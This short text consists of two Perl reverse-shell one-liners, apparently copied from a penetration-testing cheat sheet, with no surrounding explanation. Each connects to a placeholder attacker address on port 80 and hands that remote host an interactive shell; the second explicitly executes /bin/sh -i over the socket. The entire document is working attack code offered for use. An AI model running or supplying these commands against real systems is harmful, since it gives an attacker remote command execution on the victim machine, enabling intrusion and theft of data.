perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");
STDIN->fdopen($c,r);
$~->fdopen($c,w);
system$_ while<>;'

OR

perl -e 'use Socket;
$i="ATTACKING-IP";
$p=80;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");};'
